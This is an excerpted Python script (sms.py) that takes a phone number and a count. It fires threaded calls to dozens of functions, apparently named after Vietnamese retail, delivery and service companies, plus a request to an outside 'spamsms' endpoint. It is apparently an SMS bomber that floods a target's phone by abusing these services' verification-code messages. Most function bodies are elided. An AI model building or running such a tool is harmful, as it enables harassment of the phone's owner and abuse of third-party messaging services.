...
if len(sys.argv) != 3:
    print("Usage: python sms.py <phone> <count>")	
    sys.exit(1)
...
def api(phone):
    response = requests.get(f"https://natnetwork.sbs/spamsms?phone={phone}&count=10")
...
def run(phone,i):
    ...
    threading.submit(hoang,phone)
    threading.submit(winmart,phone)
    threading.submit(alf,phone)
    threading.submit(guma,phone)
    threading.submit(kingz,phone)
    threading.submit(acfc,phone)
    threading.submit(phuc,phone)
    threading.submit(medi,phone)
    ...
    threading.submit(cathay,phone)
    threading.submit(ahamove,phone)
    threading.submit(otpmu,phone)
    threading.submit(vtpost,phone)
    threading.submit(shine,phone)
    threading.submit(domi,phone)
    threading.submit(fm,phone)
    threading.submit(cir,phone)
    threading.submit(hoanvu,phone)
    threading.submit(tokyo,phone)
    threading.submit(shop,phone)
    threading.submit(beau,phone)
    threading.submit(fu,phone)
    threading.submit(lote,phone)
    threading.submit(lon,phone)
    threading.submit(api,phone)
